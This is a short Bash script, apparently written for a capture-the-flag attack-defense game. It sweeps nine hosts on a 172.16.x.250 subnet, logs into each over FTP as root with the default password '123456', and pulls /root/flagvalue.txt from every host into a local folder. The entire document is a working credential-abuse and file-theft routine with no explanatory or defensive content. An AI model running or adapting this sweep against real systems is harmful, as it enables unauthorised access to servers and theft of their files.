mkdir /ftp
for i in $(seq 101 109)
do
timeout 0.1 ftp -n 172.16.$i.250 << EOF
user root 123456
get /root/flagvalue.txt /ftp/$i.txt 
bye  #易错点
EOF
echo 172.16.$i.250
cat /ftp/$i.txt
done


